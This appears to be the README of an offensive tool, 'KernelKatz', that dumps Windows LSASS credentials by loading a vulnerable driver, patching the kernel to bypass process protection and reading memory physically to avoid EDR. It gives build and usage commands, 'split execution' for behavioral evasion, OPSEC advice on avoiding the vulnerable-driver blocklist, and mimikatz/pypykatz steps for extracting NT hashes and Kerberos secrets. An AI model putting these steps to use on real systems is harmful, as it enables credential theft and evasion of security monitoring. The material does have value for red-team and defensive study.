# KernelKatz

> A BYOVD LSASS credential dumper based on a physically patched ntoskrnl trampoline. ZwOpenProcess runs with PreviousMode=Kernel, PPL untouched. Hybrid physical memory dump via CR3 page table walk, hand built minidump.

<img width="1026" height="765" alt="image" src="https://github.com/user-attachments/assets/edb0a6c0-dc2f-4cac-bdef-e3e41b336de8" />

---

## How it works

KernelKatz never calls `OpenProcess` on LSASS, never touches `EPROCESS.Protection`, and never clones the process. Instead:

```
 0. init_syscalls()    map fresh ntdll from \KnownDlls (unhooked, image-backed)
 1. load_driver()      WinMem.sys physical R/W via NtLoadDriver (no SCM, no Event 7045)
 2. dm::Engine         physically patch the ntoskrnl!NtShutdownSystem stub with
                       `jmp [rip+0]; dq <target>` (14 bytes), restored after each call
 3. open_process()     ZwOpenProcess via trampoline: PPL checks only apply to
                       user-mode callers, so we get a PROCESS_ALL_ACCESS handle on LSASS
 4. get_cr3/get_peb    PsLookupProcessByProcessId + MmGetPhysicalAddress +
                       PsGetProcessPeb, all via trampoline (4 args max, register-only)
 5. dump_lsass()       regions via NtQueryVirtualMemory direct syscall;
                       pages via CR3 page-table walk + physical read (EDR-invisible),
                       NtReadVirtualMemory fallback for paged-out pages only;
                       hand-built MDMP (pypykatz/mimikatz/KvcForensic-compatible)
 6. XOR encrypt + write to disk (never plaintext at rest)
```

### Why the `NtShutdownSystem` trampoline?

`Zw*` kernel routines dispatch through `KiServiceInternal`, which sets `PreviousMode=KernelMode`. This is the same mechanism every legitimate driver uses. By physically redirecting the `NtShutdownSystem` service routine to `ZwOpenProcess`, the open executes as kernel: PPL access checks are skipped and the handle lands directly in our process handle table. The kernel patch lives for microseconds per call and is always restored (PatchGuard-safe). No kernel structures are modified, only a transient code patch.

`NtShutdownSystem` is ideal: legitimately called only during system shutdown, exported by both ntdll and ntoskrnl, and unmonitored by EDRs.

## Features

- **Kernel trampoline engine**: arbitrary exported kernel calls (4 args max, register-only) via physical stub patching, with physical-memory scan discovery and shellcode verification
- **PPL bypass without PPL tampering**: no `EPROCESS.Protection` writes, no handle theft, no process clone
- **Hybrid physical dump**: CR3 page-table walk (PML4/PDPT/PD/PT, 4KB/2MB/1GB pages) plus direct-syscall fallback. Around 97-99% of pages are read with zero EDR visibility
- **Image-backed syscalls**: all syscalls execute from a fresh `\KnownDlls\ntdll.dll` mapping (clean bytes, legitimate image call site)
- **Zero build-specific offsets**: only `EPROCESS+0x28` (DirectoryTableBase), stable across all x64 builds
- **Split execution**: `--recon` / `--ntos-base` / `--trampoline` breaks the kernel-discovery to dump behavioral chain across two processes
- **Synthetic TEB fallback**: when PPL blocks `OpenThread` (Win11), a valid thread entry is synthesized from a dumped PEB pointer so minidump parsers stay happy
- **No SCM**: driver loads via `NtLoadDriver` with a randomized service name; registry key removed on exit

## Build

Cross-compile from Linux (MinGW):

```bash
x86_64-w64-mingw32-g++ -std=c++23 -s -O2 \
  main.cpp core/syscall.cpp engine/dmengine.cpp dump/hybrid.cpp \
  driver/driver.cpp \
  -lntdll -lbcrypt -ladvapi32 -static -o KernelKatz.exe
```

Place `WinMem.sys` next to the binary. Requires administrator (SeDebugPrivilege + SeLoadDriverPrivilege).

## Usage

```
KernelKatz.exe                                     # full dump (XOR .enc output)
KernelKatz.exe -o out.enc                          # custom output path
KernelKatz.exe --no-encrypt                        # write raw .dmp
KernelKatz.exe --recon                             # discover ntos base + trampoline PA, print, exit
KernelKatz.exe --ntos-base HEX --trampoline HEX    # dump using precomputed values (split mode)
KernelKatz.exe --probe HEX                         # query a VA inside LSASS (diagnostic), exit
```

### Split execution (behavioral evasion)

```powershell
# Process A: discovery only, exits immediately
.\KernelKatz.exe --recon
#   prints: --ntos-base FFFFF80... --trampoline 1A2B...

# Process B: no kernel discovery, straight to dump
.\KernelKatz.exe --ntos-base FFFFF80... --trampoline 1A2B...
```

## Parsing the dump

```bash
python decrypt.py <file.enc> 0x<KEY>     # decrypt + auto-parse with pypykatz
```

| Target build | Parser |
|---|---|
| up to Win11 24H2 (26100) | pypykatz / mimikatz work out of the box |
| Win11 25H2+ (26200+) | [KvcForensic](https://github.com/wesmar/KvcForensic): templates cover 26200/26H1; pypykatz and stock mimikatz lag behind the lsasrv changes |

```bash
# KvcForensic (Linux build available)
KvcForensic --analyze-dump --input lsass.dmp \
  --templates resources/KvcForensic.json --reveal-secrets

# mimikatz (needs a master build with 25H2 support)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## Validated

| Target | Build | Dump | Extraction |
|---|---|---|---|
| Windows 10 22H2 | 19045.6456 | ✅ 53 MB, 0 failed pages | ✅ MSV NT/SHA1 + Kerberos (pypykatz and KvcForensic) |
| Windows 11 25H2 | 26200.8875 | ✅ 80 MB, 97-99% physical, 0 failed pages | ✅ MSV NT/SHA1 (KvcForensic) |

## OPSEC notes

- The driver loads without SCM (no Event 7045), but kernel image-load callbacks still see it. Use a driver that is not on the Microsoft Vulnerable Driver Blocklist.
- All syscalls run from the fresh image-backed ntdll mapping (no RWX call sites).
- The LSASS handle is opened in kernel context. `ObRegisterCallbacks`-based sensors may still attribute it. The physical dump path never touches LSASS virtually for about 97-99% of pages.
- Output is XOR-encrypted on disk (single-byte key printed to console; rotate to your own scheme for real engagements).

## Project structure

```
main.cpp            CLI + orchestration
core/syscall.*      fresh ntdll mapping + syscall wrappers (image-backed call sites)
engine/dmengine.*   kernel trampoline engine (scan/patch/call)
dump/hybrid.*       hybrid physical minidump builder
driver/driver.*     WinMem.sys loader + physical R/W primitives
decrypt.py          XOR decrypt + pypykatz parse helper
```

## Credits

- Technique adapted from [d3sh1n/lsass-dumper](https://github.com/d3sh1n/lsass-dumper) (winio mode)
- [wesmar/KvcForensic](https://github.com/wesmar/KvcForensic): the only public parser currently handling 25H2 lsasrv layouts
- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) and [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) for the minidump ecosystem
